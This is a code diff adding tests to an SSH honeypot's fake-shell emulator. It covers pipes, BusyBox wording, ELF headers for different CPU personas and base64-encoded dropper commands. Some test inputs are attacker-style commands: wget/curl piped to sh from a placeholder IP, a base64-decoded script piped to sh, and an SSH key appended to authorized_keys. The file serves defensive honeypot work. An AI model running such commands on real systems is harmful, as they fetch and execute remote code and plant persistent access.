@@ -1,3 +1,5 @@
+import dataclasses
+
 from honeypot.core.engine import InteractionEngine
 from honeypot.core.persona import get_persona
 from honeypot.core.session import SessionState
@@ -383,7 +385,7 @@ def test_echo_into_a_file_or_pipe_prints_nothing():
     prompt = session.prompt()
 
     assert engine.process("echo ssh-rsa AAAA >> .ssh/authorized_keys", session) == prompt
-    assert engine.process("echo aGk= | base64 -d", session) == prompt
+    assert engine.process("echo aGk= | base64 -d", session) == f"hi{prompt}"
     assert engine.process("echo hi 2>/dev/null", session) == f"hi\n{prompt}"
     assert session.commands[-1]["cmd"] == "echo hi 2>/dev/null"
 
@@ -458,14 +460,31 @@ def test_cat_of_a_system_program_prints_a_header_for_the_persona_cpu():
     engine = InteractionEngine()
     session = create_session()
 
-    header = engine.process("cat /bin/echo", session).removesuffix(session.prompt())
+    output = engine.process("cat /bin/echo", session).removesuffix(session.prompt())
+    # The bytes the SSH channel sends (it encodes with surrogateescape)
+    header = output.encode("utf-8", "surrogateescape")
 
-    assert header[:4] == "\x7fELF"
-    assert header[4] == "\x02"  # 64-bit
-    assert header[5] == "\x01"  # little-endian
-    assert header[18] == "\x3e"  # x86_64
-    assert all(ord(char) < 0x80 for char in header)
+    assert header[:4] == b"\x7fELF"
+    assert header[4] == 2  # 64-bit
+    assert header[5] == 1  # little-endian
+    assert header[18] == 0x3E  # x86_64
     assert engine.process("cat /usr/bin/echo", session).startswith("\x7fELF")
+
+
+def test_cat_of_a_system_program_on_an_arm64_persona_carries_the_raw_cpu_byte():
+    """0xB7 isn't valid UTF-8 on its own; it must still arrive as one byte."""
+    engine = InteractionEngine()
+    persona = dataclasses.replace(
+        get_persona("generic_linux"),
+        uname_output="Linux pi 6.1.0-rpi7 #1 SMP aarch64 GNU/Linux",
+    )
+    session = SessionState(("127.0.0.1", 4444), persona=persona)
+
+    output = engine.process("cat /bin/echo", session).removesuffix(session.prompt())
+    header = output.encode("utf-8", "surrogateescape")
+
+    assert header[4] == 2
+    assert header[18:20] == b"\xb7\x00"
 
 
 def test_cat_of_a_system_program_on_a_mips_router_says_mips():
@@ -502,3 +521,90 @@ def test_bin_directories_list_the_programs():
     assert "usr" in engine.process("ls /", session)
     assert "cat: /usr/bin: Is a directory" in engine.process("cat /usr/bin", session)
     assert "Not a directory" in engine.process("cd /bin/echo", session)
+
+
+def test_pipes_feed_each_command_the_previous_output():
+    engine = InteractionEngine()
+    session = create_session()
+    prompt = session.prompt()
+
+    assert engine.process("echo hello | cat", session) == f"hello\n{prompt}"
+    assert engine.process("cat /etc/passwd | grep root | wc -l", session) == f"1\n{prompt}"
+    assert engine.process("cat /etc/passwd | head -n 1", session).startswith("root:")
+    assert engine.process("echo 'a|b'", session) == f"a|b\n{prompt}"
+    assert engine.process("echo hi | grep -c zzz", session) == f"0\n{prompt}"
+    assert engine.process("echo hi | grep -v zzz", session) == f"hi\n{prompt}"
+
+
+def test_errors_inside_a_pipeline_go_to_the_screen_not_down_the_pipe():
+    engine = InteractionEngine()
+    session = create_session()
+    prompt = session.prompt()
+
+    assert engine.process("nosuch | wc -l", session) == (
+        f"bash: nosuch: command not found\n0\n{prompt}"
+    )
+    assert "syntax error near unexpected token `|'" in engine.process("| ls", session)
+
+
+def test_piped_scripts_run_through_the_fake_shell():
+    """`echo <base64> | base64 -d | sh` is how many droppers hide their
+    commands; the decoded commands get the same fake answers."""
+    engine = InteractionEngine()
+    session = create_session()
+    prompt = session.prompt()
+
+    # "whoami\nid\n" in base64
+    response = engine.process("echo d2hvYW1pCmlkCg== | base64 -d | sh", session)
+    assert response == f"root\nuid=0(root) gid=0(root) groups=0(root)\n{prompt}"
+    assert engine.process("sh -c 'echo a; echo b'", session) == f"a\nb\n{prompt}"
+    # exit inside a subshell or pipeline doesn't end the login
+    assert engine.process("sh -c exit", session) == prompt
+    assert engine.process("echo hi | exit", session) == prompt
+    assert engine.process("echo hi | base64", session) == f"aGkK\n{prompt}"
+    assert engine.process("echo '!!' | base64 -d", session) == f"base64: invalid input\n{prompt}"
+
+
+def test_quiet_downloads_print_nothing_and_options_values_are_not_urls():
+    engine = InteractionEngine()
+    session = create_session()
+    prompt = session.prompt()
+
+    assert engine.process("wget -qO- http://203.0.113.9/x | sh", session) == prompt
+    assert engine.process("curl -s http://203.0.113.9/x | sh", session) == prompt
+    assert "Could not resolve host: 203.0.113.9" in engine.process(
+        "curl -fsSL http://203.0.113.9/x", session
+    )
+    assert "unable to resolve host address '203.0.113.9'" in engine.process(
+        "wget -O /tmp/x http://203.0.113.9/x", session
+    )
+
+
+def test_busybox_router_errors_use_busybox_wording():
+    engine = InteractionEngine()
+    session = SessionState(("127.0.0.1", 4444), persona=get_persona("busybox_router"))
+
+    assert engine.process("nosuch", session).startswith("-sh: nosuch: not found\n")
+    assert engine.process("/tmp/bot", session).startswith("-sh: /tmp/bot: not found\n")
+    assert engine.process("cd /nope", session).startswith(
+        "-sh: cd: can't cd to /nope: No such file or directory\n"
+    )
+    assert engine.process("cat nope", session).startswith(
+        "cat: can't open 'nope': No such file or directory\n"
+    )
+    assert engine.process("cat /etc", session).startswith("cat: read error: Is a directory\n")
+    assert engine.process("ls /nope", session).startswith("ls: /nope: No such file or directory\n")
+    assert engine.process("wget http://203.0.113.9/x", session).startswith(
+        "wget: bad address '203.0.113.9'\n"
+    )
+    assert engine.process("; ls", session).startswith('-sh: syntax error: unexpected ";"\n')
+    assert engine.process("curl http://203.0.113.9/x", session).startswith("-sh: curl: not found\n")
+
+
+def test_invalid_utf8_in_a_command_is_logged_as_visible_text():
+    engine = InteractionEngine()
+    session = create_session()
+
+    engine.process("echo \udcff", session)
+
+    assert session.commands[-1]["cmd"] == "echo \\xff"
